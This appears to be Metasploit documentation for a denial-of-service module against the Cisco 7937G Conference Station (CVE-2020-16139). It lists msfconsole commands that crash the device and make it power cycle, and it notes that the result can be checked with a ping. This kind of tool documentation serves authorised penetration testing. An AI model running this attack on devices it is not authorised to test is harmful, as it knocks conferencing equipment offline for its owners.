## Vulnerable Application

  1. Obtain a Cisco 7937G Conference Station.
  2. Enable Web Access on the device (default configuration).
  3. It has been observed that based on the firmware available from Cisco, all version are likely vulnerable.

## Verification Steps

  1. Start msfconsole
  2. Do: `use auxiliary/dos/cisco/CVE-2020-16139`
  3. Do: `set RHOST 192.168.1.10`
  4. Do: `run`
  5. The conference station should become inoperable and then power cycle itself.

## Options

  1. rhost (required) - Target addres

## Scenarios

Because both successful and unsuccessful attacks result in the request timing out, there
is no way to be sure that the attack was completed. It is recommended to attempt a ping
to the device immediately afterward to verify device is offline/reseting.
